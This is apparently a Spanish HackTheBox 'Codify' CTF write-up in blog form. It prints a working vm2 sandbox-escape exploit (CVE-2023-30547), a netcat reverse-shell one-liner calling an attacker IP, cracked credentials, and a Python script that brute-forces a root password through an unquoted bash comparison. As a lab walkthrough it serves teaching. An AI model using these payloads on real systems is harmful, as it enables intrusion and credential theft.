---
layout: post
title: HTB Codify
date: '2023-11-12 16:11:33 -0500'
categories: [HTB, Easy]
tags: [ CVE , Web, Javascript, RCE , SQL , Enumeration, Bash , Python , Sudoers , Regex , John, Hash ]
image:
  path: /codify/preview.jpg
  alt: Codify
---

## Resumen

![logo](/codify/logo.png){: .right w="200" h="200" }

**Codify** es una máquina bastante interesante. El inicio consiste en enumerar la versión de un **sandbox** de código donde, al investigar un poco, se descubre que tiene un **CVE** que permite la ejecución de comandos **(RCE)**. Gracias a esto, se puede obtener una shell reversa.

Dentro de la máquina, solo hace falta explorar un poco en la ruta **/var/www** y se encuentra un archivo **.db** interesante que contiene un usuario de la máquina y la **contraseña hasheada** de uno de los usuarios del host. Después de romper el **hash**, solo hace falta autenticarse para darse cuenta de que se tienen privilegios a nivel de **sudoers** para ejecutar un script que consume un archivo que parece contener la contraseña del **usuario root**.

Se debe abusar de una comparación que se realiza entre la credencial y el input proporcionado por el usuario. Gracias a un error de programación en **bash**, se puede hacer uso de **expresiones regulares** para realizar un **bypass**. Y el punto fuerte de la escalada, probar letra por letra con el fin de descubrir cuál es la contraseña completa del del usuario.

En mi opinión, fue una máquina bastante **divertida**. La escalada hasta el primer usuario no fue muy complicada; Ya que, como todo, la clave está en **enumerar**. Sin embargo, la escalada a **root** fue totalmente nueva para mí, por lo que aprendí un concepto nuevo y muy interesante. Además que crear el script para poder dumpear la contraseña fue bastante **cool**.

## Reconocimiento

Para comenzar, se realiza un **ping** para intentar determinar con qué sistema operativo cuenta la máquina.

```bash
❯ ping -c 1 10.10.11.239
PING 10.10.11.239 (10.10.11.239) 56(84) bytes of data.
64 bytes from 10.10.11.239: icmp_seq=1 ttl=63 time=174 ms
```
{: .nolineno}

## Escaneo de Puertos

Ahora se realiza un escaneo con **Nmap** para verificar qué **puertos** están abiertos en el host:

```bash
❯ nmap -p- --min-rate 2000 10.10.11.239  -Pn -oG openPorts

Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-12 16:19 -05
Nmap scan report for codify.htb (10.10.11.239)
Host is up (0.092s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
```
{: .nolineno}
Con esa información, se puede realizar un escaneo mucho más detallado sobre cada uno de ellos mediante el siguiente comando:

```bash
nmap -p22,80,3000 -sVC --min-rate 2000 10.10.11.239 -oN VersionPorts -Pn  

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)
|_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Codify
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}
### Nota

Es importante guardar la información obtenida de los escaneos en algún archivo para no tener que volver a realizarlos en el futuro si la información es necesaria.



## Enumeración

Al intentar revisar qué hay dentro de la **web**, se observa que la **IP** está registrada en un **dominio**. Por lo tanto, es necesario agregar esta información al archivo **/etc/hosts**.

![hosts](/codify/hosts.png)

```bash
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others
10.10.11.239 codify.htb
```
{: .nolineno file="/etc/hosts"}

![web](/codify/web.png)
        
Esta web parece cumplir la función de ser un **sandbox** para la ejecución de código **JS** online, pero aparentemente cuenta con algunas restricciones para evitar que algún usuario malintencionado comprometa la seguridad de la web ;).

![Limitations](/codify/limitations.png)

Y dentro del editor de código, se puede ver lo siguiente:

![sandbox](/codify/editor.png)

Además de esto, al revisar la sección **about us**, se puede ver qué **software** se está utilizando para la gestión del código y su versión. 

![about](/codify/about.png)

Según el hipervínculo, se está utilizando vm2 en su versión 3.9.16.

>VM2 es una biblioteca popular que se utiliza para ejecutar código no confiable en un entorno aislado en Node. js.
{: .prompt-info}

![version](/codify/version.png)

Al buscar en internet, se encuentra que la versión está relacionada con el [CVE-2023-30547](https://nvd.nist.gov/vuln/detail/CVE-2023-30547), donde se explica que debido a un error se pueden llegar a ejecutar comandos (**RCE**) dentro del host víctima para escapar del sandbox.


![cve](/codify/cve.png)

## Explotación

Conociendo el **CVE**, se encuentra el siguiente [PoC](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244) en **GitHub**:

```javascript
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
}
`

console.log(vm.run(code));
```
Solo hace falta cambiar el **payload** que se encuentra dentro del campo `execSync` por el comando que se desea ejecutar.

![explotation](/codify/explotation.png)

### Nota
En este punto, solo hace falta obtener la shell reversa. Intenté con varias opciones y la única que funcionó fue la siguiente:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.135 1234 >/tmp/f
```
{: .nolineno}

Se puso a la escucha con `nc`:

```bash
nc -lvp 1234
```
{: .nolineno}

Y se ejecutó el siguiente payload:

```javascript
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.135 1234 >/tmp/f');
}
`

console.log(vm.run(code));
```

Con eso se obtiene **acceso** dentro de la máquina.
```bash
svc@codify:~$ whoami
whoami
svc
svc@codify:~$ pwd
pwd
/home/svc
svc@codify:~$   
```
{: .nolineno}

## Escalada de Privilegios (Joshua)
Para empezar, se quiere generar una **TTY interactiva** para poder ejecutar comandos dentro de la máquina de forma más cómoda. Por lo que se sigue la siguiente lista de comandos:

```bash
script /dev/null -c bash
ctrl + z
stty raw -echo;fg
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows 24 columns 126
```
Y se ha obtenido una terminal interactiva.


Al revisar dentro de la ruta **/var/www/contact**, se encuentra un archivo llamado **tickets.db** . Sin embargo, para revisarlo de forma adecuada, se puede hacer uso de **SQLite3** y realizar consultas **SQL**.

```bash
sqlite3 tickets.db
```
{: .nolineno}

```sql
sqlite> .tables 
tickets  users  
sqlite> select * from users ;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
sqlite> 
```
{: .nolineno}


Ahora se puede **crackear** el **hash** con **John the Ripper**, Pero primero es necesario guardarlo en un archivo.

```bash
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```
{: .nolineno file="hash"}

Y se ejecuta el siguiente comando:

```bash
john hash  -wordlist=/usr/share/wordlists/rockyou.txt

spongebob1       (?)
1g 0:00:00:39 DONE (2023-11-12 20:06) 0.02559g/s 35.01p/s 35.01c/s 35.01C/s crazy1..angel123
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```
{: .nolineno}

Contando con **credenciales**, ahora se pueden ejecutar acciones como el usuario **joshua**.

```bash
su joshua
password: spongebob1

joshua@codify:~$ whoami
joshua
joshua@codify:~$ 
```
{: .nolineno}

## Escalada de Privilegios (Root)

Al revisar los privilegios a nivel de sudoers, se puede ver lo siguiente:

```bash
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```
{: .nolineno}

Al revisar el contenido del script, se encuentra lo siguiente:
```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'

```
{: file="opt/scrips/mysql-backup.sh"}

Para esta parte, quiero darle las gracias al **writeup** de [Aakash Dubey](https://medium.com/@aakashdubey20010907/codify-htb-writeup-933488bfbfff), que me ayudó a entender mucho mejor qué rayos estaba pasando.

En primer lugar, el **script** solicita una contraseña y la compara con la contraseña del usuario root que se encuentra almacenada dentro de un archivo. Si la contraseña ingresada es igual, se realiza una copia de la **base de datos** en la ruta **/var/backups/mysql**.

Según explican en los **artículos**  [BashPitfalls](https://mywiki.wooledge.org/BashPitfalls?source=post_page-----933488bfbfff--------------------------------) y [Safe ways to do things in bash](https://github.com/anordal/shellharden/blob/master/how_to_do_things_safely_in_bash.md?source=post_page-----933488bfbfff--------------------------------), la vulnerabilidad de este **script** se encuentra en el **if** donde se están comparando las **credenciales**. Dado que el input del usuario no se coloca dentro de **comillas (" ")**, no se define como una cadena, lo que permite que se interpreten argumentos como **expresiones regulares (regex)**. El problema de esto es que al realizar la comparación, el carácter * permite realizar un bypass de la comprobación.

> Las expresiones regulares, también conocidas como regex, son secuencias de caracteres que conforman un patrón de búsqueda. Estas herramientas poderosas permiten realizar búsquedas avanzadas y manipulaciones de texto mediante la definición de reglas específicas.
{: .prompt-info }

```bash
Password="root"

if [[ $Password == * ]]; # => Devuelve True
if [[ $Password == "*" ]]; # => Devuelve False
if [[ $Password == r* ]]; # => Devuelve True
if [[ $Password == "r*" ]]; # => Devuelve False 

```
{: file="example.sh"}

Ahora, la vulnerabilidad se puede explotar realizando un script que pruebe caracter por caracter, añadiéndole un * al final para ver cuál está dentro de la contraseña. Cada vez que se encuentre uno válido, se puede agregar otro nuevo a la contraseña hasta encontrarla completa.

```python
import string
import subprocess

chars = list(string.ascii_letters + string.digits +"#!%?_-.,+/" + " ")
password = ""
found = False

while not found:
    for char in chars:
        command = f"echo '{password}{char}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
        if char == " ":
            print("Password dumpeada")
            print(password)
            found = True

        elif "Password confirmed!" in output:
            password += char
            print(password)
            break       
```
{: file="dumper.py"}

Con el script, se obtiene el siguiente resultado:
```bash
joshua@codify:/tmp$ python3 dumper.py
k
kl
klj
kljh
kljh1
kljh12
kljh12k
kljh12k3
kljh12k3j
kljh12k3jh
kljh12k3jha
kljh12k3jhas
kljh12k3jhask
kljh12k3jhaskj
kljh12k3jhaskjh
kljh12k3jhaskjh1
kljh12k3jhaskjh12
kljh12k3jhaskjh12k
kljh12k3jhaskjh12kj
kljh12k3jhaskjh12kjh
kljh12k3jhaskjh12kjh3
Password dumpeada
kljh12k3jhaskjh12kjh3
```
{: .nolineno}

Y al probar la credencial obtenida, se puede ver que se ha obtenido acceso como el usuario root :3   .

```bash
joshua@codify:/tmp$ su root
Password: kljh12k3jhaskjh12kjh3
root@codify:/tmp# whoami
root
root@codify:/tmp#
```
{: .nolineno}
